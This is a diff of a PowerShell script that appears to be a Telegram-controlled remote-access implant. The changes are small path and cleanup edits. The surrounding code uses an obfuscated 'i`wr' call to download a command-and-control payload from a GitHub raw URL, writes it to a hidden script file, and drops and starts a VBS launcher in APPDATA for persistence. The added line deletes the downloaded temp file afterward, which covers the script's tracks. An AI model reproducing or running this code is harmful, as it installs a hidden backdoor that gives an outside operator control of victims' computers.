@@ -234,7 +234,7 @@ if ($newScriptPath.Length -lt 100){
     "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
     i`wr -Uri "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1" -OutFile "$env:temp/temp.ps1"
     sleep 1
-    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
+    Get-Content -Path "$env:TEMP/temp.ps1" | Out-File $newScriptPath -Append
     }
 $attributes = [System.IO.FileAttributes]::Hidden
 Set-ItemProperty -Path $newScriptPath -Name Attributes -Value $attributes
@@ -429,7 +429,7 @@ if ($newScriptPath.Length -lt 100){
     "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
     "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
     i`wr -Uri "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1" -OutFile "$env:temp/temp.ps1"
-    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
+    Get-Content -Path "$env:TEMP/temp.ps1" | Out-File $newScriptPath -Append
     }
 $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
@@ -439,6 +439,7 @@ $pth = "$env:APPDATA\Microsoft\Windows\temp.vbs"
 $tobat | Out-File -FilePath $pth -Force
 sleep 2
 Start-Process -FilePath $pth
+rm -path "$env:TEMP\temp.ps1" -Force
 exit
 }
 # --------------------------------------------- TELEGRAM FUCTIONS -------------------------------------------------
